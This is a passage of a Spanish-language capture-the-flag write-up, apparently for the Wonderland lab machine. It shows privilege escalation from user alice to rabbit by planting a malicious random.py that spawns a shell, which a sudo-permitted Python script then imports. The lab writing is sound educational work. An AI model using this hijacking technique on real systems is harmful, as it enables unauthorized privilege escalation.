# Fase 3 — Escalada: alice → rabbit (Python library hijacking)

[← Volver al README](../README.md) · [← Fase anterior](./02-stego-and-foothold.md)

Comprobando permisos sudo:

```bash
sudo -l
```

```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

El script importa el módulo `random`:

```python
import random
...
```

Python busca los módulos primero en el directorio actual antes que en las rutas del sistema (`sys.path` empieza con `''`). Esto permite colocar un `random.py` propio en el mismo directorio del script para que sea importado en su lugar:

```bash
nano /home/alice/random.py
```

```python
import os
os.system("/bin/bash")
```

Ejecutando el script como `rabbit`:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Se obtiene una shell como **rabbit**.

➡️ Siguiente: [Fase 4 — rabbit → hatter (PATH hijacking)](./04-privesc-rabbit-to-hatter.md)
